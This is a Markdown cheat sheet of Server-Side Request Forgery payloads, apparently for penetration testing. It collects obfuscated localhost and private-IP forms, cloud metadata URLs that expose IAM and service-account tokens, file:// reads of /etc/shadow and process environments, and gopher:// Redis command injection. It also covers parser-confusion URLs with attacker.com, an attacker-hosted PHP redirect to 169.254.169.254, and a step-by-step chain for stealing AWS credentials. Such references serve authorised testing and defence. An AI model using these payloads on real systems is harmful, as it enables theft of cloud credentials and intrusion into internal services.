# SSRF Payload Reference

Curated payloads for Server-Side Request Forgery testing. Adapt targets and bypass techniques to the specific application and infrastructure.

---

## Internal IP Targets

### Localhost Variations

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.1
http://127.0.1
http://0177.0.0.1        # octal
http://2130706433         # decimal (127.0.0.1)
http://0x7f000001         # hex (127.0.0.1)
http://0x7f.0x0.0x0.0x1  # dotted hex
http://017700000001       # full octal
http://0               # shorthand for 0.0.0.0
```

### Private Network Ranges

```
http://10.0.0.1
http://10.0.0.0/8 range
http://172.16.0.1
http://172.16.0.0/12 range
http://192.168.0.1
http://192.168.1.1
http://192.168.0.0/16 range
```

### Common Internal Services

```
http://127.0.0.1:80      # Web server
http://127.0.0.1:443     # HTTPS
http://127.0.0.1:8080    # Alt web / proxy
http://127.0.0.1:8443    # Alt HTTPS
http://127.0.0.1:9200    # Elasticsearch
http://127.0.0.1:6379    # Redis
http://127.0.0.1:27017   # MongoDB
http://127.0.0.1:3306    # MySQL
http://127.0.0.1:5432    # PostgreSQL
http://127.0.0.1:11211   # Memcached
http://127.0.0.1:2379    # etcd
http://127.0.0.1:8500    # Consul
http://127.0.0.1:10250   # Kubelet API
http://127.0.0.1:4194    # cAdvisor
```

---

## Cloud Metadata Endpoints

### AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### AWS (IMDSv2 -- requires token)

```bash
# Step 1: Get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
```

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
```

### Kubernetes

```
https://kubernetes.default.svc
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/secrets
# Service account token at: /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## IP Obfuscation Techniques

### Decimal Notation

Convert 127.0.0.1 to decimal: `2130706433`

```
http://2130706433
```

Convert 169.254.169.254 to decimal: `2852039166`

```
http://2852039166
```

### Hex Notation

```
http://0x7f000001          # 127.0.0.1
http://0xa9fea9fe          # 169.254.169.254
```

### Octal Notation

```
http://0177.0.0.1          # 127.0.0.1
http://0251.0376.0251.0376 # 169.254.169.254
```

### IPv6

```
http://[::1]                           # localhost
http://[0:0:0:0:0:ffff:127.0.0.1]     # IPv6-mapped IPv4
http://[::ffff:7f00:1]                 # compressed
http://[::ffff:169.254.169.254]        # metadata
```

### Mixed Notation

```
http://0x7f.0.0.1          # hex first octet only
http://0177.0.0.0x1        # mixed octal and hex
http://127.0.0.1.nip.io    # DNS wildcard service
http://127.0.0.1.sslip.io
```

---

## DNS Rebinding

Technique: Register a domain that alternates DNS responses between an allowed IP and the target internal IP.

```
# Use services like rebind.it or rbndr.us
# Example: resolves alternately to attacker IP and 169.254.169.254
http://7f000001.c0a80001.rbndr.us  # alternates 127.0.0.1 and 192.168.0.1
```

Manual setup: Configure a DNS server to return `1.2.3.4` on first query and `169.254.169.254` on second query (short TTL). The app validates the first resolution but fetches using the second.

---

## Protocol Smuggling

### file:// Protocol

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp
file:///C:/Windows/win.ini  # Windows
```

### gopher:// Protocol

Redis command injection:

```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a
```

Send arbitrary HTTP request via gopher:

```
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
```

### dict:// Protocol

```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats
```

---

## URL Parser Differentials

Exploit differences between URL validation and URL fetching libraries:

```
http://attacker.com@127.0.0.1          # userinfo confusion
http://127.0.0.1#@attacker.com         # fragment confusion
http://127.0.0.1\@attacker.com         # backslash confusion
http://attacker.com\@127.0.0.1         # varies by parser
http://127.0.0.1:80\@attacker.com
http://127.1.1.1:80\tfoo@google.com    # tab character
```

URL with credentials:

```
http://user:pass@127.0.0.1
http://127.0.0.1%2523@attacker.com     # double-encoded #
```

Unicode normalization:

```
http://ⓔⓧⓐⓜⓟⓛⓔ.com  # circled letters normalize to ascii
http://127.0.0.1/　/    # fullwidth spaces
```

---

## Redirect-Based SSRF Bypasses

When the app validates the URL hostname but follows redirects:

### Open Redirect Chaining

```
https://trusted-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

### Attacker-Controlled Redirect

Host a page at `https://attacker.com/redirect.php`:

```php
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
```

Then submit:

```
https://attacker.com/redirect.php
```

### URL Shorteners

```
https://bit.ly/XXXXX  # pointing to http://169.254.169.254
https://tinyurl.com/XXXXX
```

### HTTP 303 via Webhook

Set up a webhook that returns a 303 redirect to the target internal endpoint.

---

## Common Injection Points

- URL/webhook fields (image URL, callback URL, import URL, feed URL)
- PDF generators (HTML-to-PDF often fetches external resources)
- File import features (import from URL)
- API integrations (webhook URLs, OAuth redirect URIs)
- HTML rendering (email templates, preview features)
- SVG processing (SVG files can contain external references)
- XML parsing (XXE leading to SSRF via DTD/entities)

---

## Proof of Concept Tips

Use out-of-band interaction to prove SSRF when response is not reflected:

```
https://BURP-COLLAB-ID.oastify.com
https://YOUR-INTERACTSH-ID.interact.sh
http://dnslog.cn
```

For AWS credential theft, chain requests:

1. `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to get role name
2. `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME` to get creds
